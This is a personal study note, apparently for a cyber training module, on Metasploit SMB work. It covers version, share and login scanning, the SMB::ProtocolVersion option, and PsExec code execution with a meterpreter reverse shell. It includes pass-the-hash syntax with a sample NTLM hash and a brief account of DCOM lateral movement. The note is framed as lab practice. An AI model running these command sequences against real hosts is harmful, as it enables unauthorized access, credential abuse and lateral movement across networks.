---
tags: [cyber, module3, metasploit]
jqr: "Module 3: SMB scanning (smb_version/enumshares/login), SMB::ProtocolVersion, PsExec plus pass-the-hash, DCOM lateral movement"
---

# SMB PsExec and DCOM

SMB (ports 139/445) is the classic Windows/Samba attack surface. This note covers scanning it, forcing a specific SMB dialect, and then, once I hold valid creds or a hash, running code on the target with PsExec or DCOM (lateral movement).

Lab only: I run these SMB modules against my own Windows/Samba VMs and nothing else (Kali 2026.2). No live MSF output in the study sandbox, so it's doc-checked but I still need to confirm on the box.

## The short version

```text
use auxiliary/scanner/smb/smb_version      # fingerprint SMB1/2/3 + OS (no auth)
use auxiliary/scanner/smb/smb_enumshares   # list shares
use auxiliary/scanner/smb/smb_login        # validate a user+pass (or lists)
set RHOSTS 192.168.1.20 ; run

use exploit/windows/smb/psexec             # auth'd code exec via ADMIN$ (creds OR hash)
set SMBUser administrator ; set SMBPass <lab-pass-or-LM:NT>
set payload windows/x64/meterpreter/reverse_tcp ; set LHOST 192.168.1.10 ; run
```

## Two different ways to abuse SMB

There are really two, and keeping them apart matters:

- Unauthenticated exploit: a memory-corruption bug lets me in *without* creds. The canonical example is EternalBlue (`ms17_010_eternalblue`, CVE-2017-0144), an SMBv1 flaw. That's a way *in*. See [Common Software Vulnerabilities](../../Knowledge%20Req/Common%20Software%20Vulnerabilities.md).
- Authenticated code execution: I *already have* an admin password or NTLM hash, so I just log in and run code. PsExec and DCOM are this. That's *lateral movement*, not initial access.

The way I picture it is lock-picking vs the front-door key. EternalBlue is lock-picking: I exploit a bug to get in with no key at all. PsExec and DCOM are the opposite, because I *already hold the key* (an admin password or its hash), so I break nothing. I walk in the front door and drive Windows' own remote-admin plumbing (the `ADMIN$` share, the service manager, DCOM objects) to run my code. Nothing here is a "vulnerability" to patch, it's designed functionality being used by someone who shouldn't have the key. That's exactly why it counts as *lateral movement*, not initial access.

Knowing which is which is an exam trap: PsExec and DCOM need creds, EternalBlue does not.

## 1. Scan SMB (version, shares, login)

```text
# a) Version / OS fingerprint — auto-detects SMB1/2/3, no auth needed
use auxiliary/scanner/smb/smb_version
set RHOSTS 192.168.1.20
run
```
This tells me the dialect and often the Windows build, and it's my first SMB move.

```text
# b) Enumerate shares (anonymous often works; creds show more)
use auxiliary/scanner/smb/smb_enumshares
set RHOSTS 192.168.1.20
set SMBUser administrator ; set SMBPass Lab-Passw0rd!
run
```
Lists shares like `ADMIN$`, `C$`, `IPC$`, plus any custom shares worth looting.

```text
# c) Credential check / spray a user+pass (or wordlists)
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.20
set SMBUser administrator ; set SMBPass Lab-Passw0rd!
run
```
Confirms the creds work before I try to execute code. `USER_FILE` / `PASS_FILE` take lists (lab only).

## 2. Force an SMB dialect with `SMB::ProtocolVersion`

> [!important] The option is `SMB::ProtocolVersion` (an **advanced** option, 2026)
> Seen via `show advanced`. It selects which SMB **dialects** the client will negotiate. Value = one or a comma-separated list of `1` (SMBv1), `2` (SMBv2), `3` (SMBv3):
> ```text
> set SMB::ProtocolVersion 1        # force SMBv1 only
> set SMB::ProtocolVersion 2,3      # allow SMBv2 and SMBv3
> set SMB::ProtocolVersion 2,3,1    # order = negotiation preference
> ```
> - This replaced the older `SMBVersion` / "smb versions" style. On current Metasploit, **`SMB::ProtocolVersion` is correct**.
> - Gotcha: the **`smb_version` scanner deregisters this option** (it deliberately probes 1/2/3 itself). I set it on the *other* SMB modules (`smb_enumshares`, `smb_login`, `psexec`, the exploits), never on `smb_version`.

> Why force a dialect at all: some bugs live in one specific dialect (EternalBlue is SMBv1-only), but a modern target negotiates up to SMBv3 by default and may not speak v1 unless asked. Pinning the client's version list is how I keep the conversation on the dialect my module actually targets.

## 3. PsExec, authenticated code execution

```text
use exploit/windows/smb/psexec
set RHOSTS 192.168.1.20
set SMBUser administrator
set SMBPass Lab-Passw0rd!
set SMBDomain .                       # . or WORKGROUP for a local account
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
run
```
On success I get a SYSTEM-level [Meterpreter](Meterpreter.md) session.

How it works, in plain English: it authenticates to the target's `ADMIN$` share over SMB, drops and executes a payload as a temporary, randomly-named Windows service, that service runs the payload as SYSTEM, and then the module cleans the service back up. It mirrors Sysinternals `PsExec.exe`, see [PsExec and Sysinternals](../../Win%20Admin/PsExec%20and%20Sysinternals.md).

### Pass-the-Hash (PtH)

I don't need the plaintext password. I feed the NTLM hash into `SMBPass` in `LMHASH:NTHASH` format:

```text
set SMBPass aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```
The LM half here is the standard "blank" value, and auth succeeds without ever cracking the password. This is why hashes from `hashdump` are as good as passwords for lateral movement.

> Why the hash is enough: NTLM authentication proves I know the *hash*, not the plaintext, and the password itself never travels on the wire. So a hash lifted from `hashdump` is a drop-in substitute and there's nothing left to crack. That one fact is the whole mechanic behind Pass-the-Hash.

**Related PsExec-family modules:**

| Module | Use |
|---|---|
| `exploit/windows/smb/psexec_psh` | PowerShell variant, no exe dropped to disk |
| `auxiliary/admin/smb/psexec_command` | run a **single command** with creds, **no session** (one-shot/recon) |
| `auxiliary/scanner/smb/psexec_loggedin_users` | psexec-style **scanner**: list logged-in users across a range |

## 4. DCOM, lateral movement over RPC

- Classic exploit: `exploit/windows/dcerpc/ms03_026_dcom`, the historic MS03-026 RPC/DCOM buffer overflow (legacy lab targets like unpatched XP/2000).
- **DCOM lateral movement** abuses DCOM objects (e.g. `MMC20.Application`, `ShellWindows`) to spawn processes on a remote host *with creds*. In practice this technique is more commonly run with Impacket's `dcomexec.py` or CrackMapExec than a core MSF module.

For the exam I just hold the concept: DCOM lateral movement is authenticated remote execution over DCOM/RPC, an alternative to PsExec/WMI.

## Traps I want to remember

- PsExec and DCOM need creds, EternalBlue does not. I classify the module before reaching for it.
- PtH uses `LMHASH:NTHASH` in `SMBPass`, the `LM:NT` colon format, not just the NT half on its own.
- `SMB::ProtocolVersion` is the modern option name (values `1`/`2`/`3`, comma-separated) and is *not* settable on `smb_version`.
- `SMBDomain .` (or `WORKGROUP`) for local accounts; use the real domain for domain accounts.
- Standard SMB order is `smb_version`, then `smb_enumshares`, then `smb_login`, then psexec. Don't burn a lockout by spraying blindly.
- PsExec drops a temporary service, which is noisy in Windows event logs (service install 7045). Fine in a lab, loud in the real world.

## Sources

- Metasploit SMB pentesting guide: https://docs.metasploit.com/docs/pentesting/metasploit-guide-smb.html
- `smb_version` module source (deregisters `SMB::ProtocolVersion`): https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/smb/smb_version.rb
- Guidelines for writing SMB modules (`SMB::ProtocolVersion` values): https://adfoster-r7.github.io/metasploit-framework/docs/development/developing-modules/libraries/smb_library/guidelines-for-writing-modules-with-smb.html
- PsExec module (Rapid7 DB): https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/
- EternalBlue module (Rapid7 DB): https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/
- MITRE ATT&CK, Pass the Hash (T1550.002): https://attack.mitre.org/techniques/T1550/002/
- MITRE ATT&CK, Remote Services: DCOM (T1021.003): https://attack.mitre.org/techniques/T1021/003/

## See also

- [Metasploit Workflow](Metasploit%20Workflow.md)
- [Meterpreter](Meterpreter.md)
- [PsExec and Sysinternals](../../Win%20Admin/PsExec%20and%20Sysinternals.md)
- [Windows CLI and net Commands](../../Win%20Admin/Windows%20CLI%20and%20net%20Commands.md)
- [Common Software Vulnerabilities](../../Knowledge%20Req/Common%20Software%20Vulnerabilities.md)
